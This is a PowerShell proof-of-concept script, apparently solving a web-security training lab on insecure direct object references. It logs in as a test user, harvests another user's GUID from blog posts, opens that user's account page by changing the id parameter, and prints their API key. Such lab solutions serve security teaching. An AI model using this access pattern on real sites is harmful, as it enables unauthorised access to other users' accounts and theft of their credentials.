# Lab06: User ID controlled by request parameter (unpredictable user IDs)
# Usage: pwsh ./poc.ps1 <URL>

param([string]$URL)

$p = "http://127.0.0.1:8080"
$c = (mktemp).Trim()

# 1. Get CSRF token
$login_page = (curl -skx $p -c $c "$URL/login") -join ""
$csrf       = [regex]::Match($login_page, 'name="csrf" value="([^"]+)"').Groups[1].Value
Write-Host "[+] CSRF Token: $csrf"

# 2. Login as wiener
$null = curl -skx $p -c $c -b $c -X POST "$URL/login" -d "csrf=$csrf&username=wiener&password=peter" 2>&1

# 3. Verify login
$myacc = (curl -skx $p -b $c "$URL/my-account") -join ""
if ($myacc -notmatch "Log out") { Write-Host "[-] Login failed"; exit 1 }
Write-Host "[+] Login successful"

# 4. Find carlos GUID via posts
$homepage = (curl -skx $p "$URL") -join ""
$postids = [regex]::Matches($homepage, 'postId=(\w+)"') | ForEach-Object { $_.Groups[1].Value } | Select-Object -Unique

$guid = $null
foreach ($id in $postids) {
    $post = (curl -skx $p -b $c "$URL/post?postId=$id") -join ""
    if ($post -match "carlos") {
        $guid = [regex]::Match($post, "userId=([^']+)").Groups[1].Value
        Write-Host "[+] Carlos GUID: $guid"; break
    }
}

# 5. Get API key
$account = (curl -skx $p -b $c "$URL/my-account?id=$guid") -join ""
if ($account -notmatch "carlos") { Write-Host "[-] Access failed"; exit 1 }
Write-Host "[+] Carlos account accessed"

Write-Host "[+] Carlos API Key: $([regex]::Match($account, 'API Key is: ([^<]+)').Groups[1].Value)"

Remove-Item $c -Force
